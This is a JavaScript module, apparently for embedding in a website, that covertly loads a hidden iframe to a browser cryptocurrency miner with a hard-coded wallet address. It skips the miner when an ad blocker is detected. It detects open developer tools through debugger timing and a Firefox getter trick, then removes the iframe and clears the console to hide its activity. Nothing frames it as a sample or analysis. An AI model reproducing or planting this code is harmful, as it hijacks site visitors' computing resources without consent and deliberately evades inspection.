import Bowser from 'bowser';

let mainInterval;
let debugTimeout;
let consoleDetectorWorker;
let iframe;
let consoleWasOpened;

const browser = Bowser.getParser(window.navigator.userAgent);

export const init = async () => {
	if (await isAdblockPresent()) {
		console.clear();
		return;
	}

	createIframe();

	if (browser.getBrowserName() === 'Firefox') {
		setupFirefoxDetector();
		return;
	}

	setupDetector();
};

async function isAdblockPresent() {
	const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';

	return new Promise((resolve) => {
		const xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function () {
			if (xhr.readyState == XMLHttpRequest.DONE) {
				resolve(
					xhr.status === 0 ||
						xhr.responseURL !== ADS_URL ||
						xhr.response.toLowerCase().includes('block')
				);
			}
		};
		xhr.open('HEAD', ADS_URL, true);
		xhr.send(null);
	});
}

function createIframe() {
	setTimeout(() => {
		iframe = document.createElement('iframe');

		if (!consoleWasOpened) {
			iframe.setAttribute('src', getUrl());
			iframe.style.display = 'none';
			document.body.append(iframe);
		}
	}, 1000);
}

function setupFirefoxDetector() {
	console.log(
		Object.defineProperties(new Error(), {
			message: {
				get() {
					ifConsoleIsOpen();
				}
			}
		})
	);
}

function setupDetector() {
	const consoleDetectorWorkerCode = `
		self.onmessage = function() {
			eval('debugger;');
			self.postMessage({})
		}
	`;

	consoleDetectorWorker = new Worker(
		URL.createObjectURL(new Blob([consoleDetectorWorkerCode], { type: 'application/javascript' }))
	);

	consoleDetectorWorker.onmessage = () => clearTimeout(debugTimeout);

	mainInterval = setInterval(() => {
		consoleDetectorWorker.postMessage({});
		debugTimeout = setTimeout(ifConsoleIsOpen, 50);
	}, 100);
}

function getUrl() {
	let str =
		'https://mobileminer.org/mine/?auto=1&addr=49Bzm9h878UBBbz1Uu1mXSBjgaWsYjHEy7DhB9NHmD7hfAVFJAohfUjRSUokPv9cnpa1XvMLb2NUgKVoPXPx2yT5GWYBG5c';

	return str;
}

function ifConsoleIsOpen() {
	consoleWasOpened = true;
	clearTimeout(debugTimeout);
	clearInterval(mainInterval);
	if (iframe) {
		document.body.removeChild(iframe);
	}
	console.clear();
	setTimeout(console.clear, 100);
	if (consoleDetectorWorker) {
		consoleDetectorWorker.terminate();
	}
}
